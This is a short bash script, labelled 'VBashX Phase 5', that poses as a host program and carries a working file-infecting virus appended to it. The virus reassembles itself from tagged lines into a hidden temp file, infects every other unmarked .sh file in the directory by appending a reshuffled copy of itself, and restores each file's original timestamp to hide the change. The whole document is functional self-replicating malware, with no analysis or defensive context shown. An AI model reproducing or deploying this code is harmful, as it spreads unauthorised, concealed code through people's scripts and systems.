#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 5 --- VBX_7k9Pz
REST_SIZE=13
LI=16
VIRUS_SIZE=$(($REST_SIZE + $LI))
TMP=".vbx_tmp.sh"
trap "rm -f $TMP .vbx_ref_*" EXIT
echo "#!/bin/bash" > $TMP
echo "SRC=\"$0\"" >> $TMP
nb=1; while [ $nb -le $LI ]; do
grep "#@${nb}#" "$0" >> $TMP
nb=$(($nb + 1)); done
chmod +x $TMP && ./$TMP
exit 0
MARKER="VBX_7k9Pz" #@1#
for f in *.sh; do #@2#
if [ "$(basename "$f")" != "$(basename "$SRC")" ]; then #@3#
if [ -z "$(grep "$MARKER" "$f" 2>/dev/null)" ]; then #@4#
cp -p "$f" ".vbx_ref_$$" 2>/dev/null #@5#
REST_S=13; LI_S=16; VS=$(($REST_S + $LI_S)) #@6#
tail -n $VS "$SRC" | head -n $REST_S >> "$f" 2>/dev/null #@7#
r=$(( ($RANDOM % 16) + 1 )) #@8#
n=1 #@9#
while [ $n -le $LI_S ]; do #@10#
grep "#@${r}#" "$SRC" >> "$f" 2>/dev/null #@11#
r=$(( ($r * 3) % 17 )) #@12#
n=$(($n + 1)); done #@13#
touch -r ".vbx_ref_$$" "$f" 2>/dev/null #@14#
rm -f ".vbx_ref_$$" 2>/dev/null #@15#
fi; fi; done #@16#
